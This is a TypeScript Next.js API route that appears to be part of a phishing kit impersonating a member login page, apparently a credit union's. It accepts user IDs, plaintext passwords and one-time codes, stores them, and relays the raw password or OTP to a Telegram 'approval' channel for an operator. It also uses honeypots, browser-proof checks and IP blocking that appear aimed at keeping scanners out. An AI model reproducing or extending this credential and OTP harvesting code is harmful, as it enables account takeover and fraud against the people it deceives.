import { formatPendingLoginDatabaseLabel } from '@/lib/database-urls'
import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages"
import { resolveMemberOrigin } from '@/lib/member-origin'
import { NextRequest, NextResponse } from 'next/server'
import { createPendingLogin } from '@/lib/pending-logins'
import { DEFAULT_PROJECT_ID } from '@/lib/project-config'
import { SITE_DISPLAY_NAME } from '@/lib/site-url'
import { hasDatabaseUrl } from '@/lib/db'
import {
  sendGwcuLoginApprovalRequest,
  sendGwcuOtpApprovalRequest,
} from '@/lib/telegram-approval-send'
import { forceBlockIp } from "@/lib/bot-risk/force-block"
import { readHoneypotValue } from "@/lib/bot-risk/honeypot"
import { hasBrowserProof, isTooFastLogin } from "@/lib/bot-risk/proof-cookies"
import { consumeRateLimit } from "@/lib/bot-risk/rate-limit"
import { isMitigationBand, ttlMsForBand } from "@/lib/bot-risk/score"
import { resolveRequestRisk } from "@/lib/bot-risk/resolve"
import { upsertIpRisk } from "@/lib/bot-risk/store"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { isLocalTestingUnlocked } from "@/lib/local-testing"

const LOG_PREFIX = `[${SITE_DISPLAY_NAME}]`

export async function POST(request: NextRequest) {

  const localTesting = typeof isLocalTestingUnlocked === "function" ? isLocalTestingUnlocked() : false
  const ip = typeof getClientIpFromRequest === "function" ? getClientIpFromRequest(request) || "Unknown" : "Unknown"
  const userAgent = request.headers.get("user-agent") || "Unknown"

  if (!localTesting) {
    const risk = await resolveRequestRisk(request)
    if (isMitigationBand(risk.band)) {
      return NextResponse.json({ error: "Forbidden" }, { status: 403 })
    }

    if (!hasBrowserProof(request)) {
      await upsertIpRisk({
        ip,
        score: 40,
        band: "watch",
        flags: ["missing_browser_proof"],
        userAgent,
        expiresAtMs: Date.now() + ttlMsForBand("watch"),
      })
      return NextResponse.json({ error: "Forbidden" }, { status: 403 })
    }
  }

  if (!hasDatabaseUrl()) {
    // Infrastructure detail stays server-side; members only ever see the kit message.
    console.error("Pending login unavailable: DATABASE_URL is not set (add it to .env.local / same Neon URL as Control Center) so requests appear in admin")
    return NextResponse.json({ error: MSG_UNABLE_REACH_VERIFICATION }, { status: 503 })
  }
  try {
    const body = await request.json()

    const dwellMs = typeof body.dwellMs === "number" ? body.dwellMs : undefined
    const interacted = typeof body.interacted === "boolean" ? body.interacted : undefined

    if (!localTesting) {
      const honeypot = readHoneypotValue(body)
      if (honeypot) {
        await forceBlockIp(ip, ["honeypot"], userAgent)
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }

      if (isTooFastLogin(request, dwellMs)) {
        await upsertIpRisk({
          ip,
          score: 55,
          band: "challenge",
          flags: ["too_fast_submit"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("challenge"),
        })
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }

      if (interacted === false && typeof dwellMs === "number" && dwellMs < 2500) {
        await upsertIpRisk({
          ip,
          score: 40,
          band: "watch",
          flags: ["no_interaction"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("watch"),
        })
      }

      const rate = await consumeRateLimit(ip, "pending_login", 8, 10 * 60 * 1000)
      if (!rate.allowed) {
        await upsertIpRisk({
          ip,
          score: 60,
          band: "challenge",
          flags: ["login_rate_limited"],
          userAgent,
          expiresAtMs: Date.now() + ttlMsForBand("challenge"),
        })
        return NextResponse.json({ error: "Forbidden" }, { status: 403 })
      }
    }

    const { userId = 'login', password = '', method, maskedEmail = '', maskedPhone = '', flow } = body
    if (!method || (method !== 'email' && method !== 'text')) {
      return NextResponse.json(
        { error: 'method is required and must be email or text' },
        { status: 400 },
      )
    }
    const memberOrigin = resolveMemberOrigin(request)
    const record = await createPendingLogin({
      requestKind: flow === 'login_otp' ? 'otp' : 'login',
      projectId: DEFAULT_PROJECT_ID,
      projectName: SITE_DISPLAY_NAME,
      userId: String(userId),
      password: String(password),
      method,
      maskedEmail: String(maskedEmail),
      maskedPhone: String(maskedPhone),
      memberOrigin,
    })

    const databaseShard = formatPendingLoginDatabaseLabel(record.id)
    try {
      if (flow === 'login_otp' || record.requestKind === 'otp') {
        const sent = await sendGwcuOtpApprovalRequest({
          userId: record.userId,
          code: record.password,
          method: record.method,
          createdAtMs: record.createdAt,
          databaseShard,
        })
        if (!sent) {
          console.warn(`${LOG_PREFIX} Telegram OTP approval not sent`)
        }
      } else {
        const sent = await sendGwcuLoginApprovalRequest({
          userId: record.userId,
          password: record.password,
          method: record.method,
          createdAtMs: record.createdAt,
          databaseShard,
        })
        if (!sent) {
          console.warn(`${LOG_PREFIX} Telegram login approval not sent`)
        }
      }
    } catch (notifyErr) {
      console.error(`${LOG_PREFIX} Telegram after pending-login create:`, notifyErr)
    }

    return NextResponse.json({ id: record.id })
  } catch (e) {
    console.error('Pending login create error:', e)
    return NextResponse.json({ error: MSG_UNABLE_REACH_VERIFICATION }, { status: 500 })
  }
}
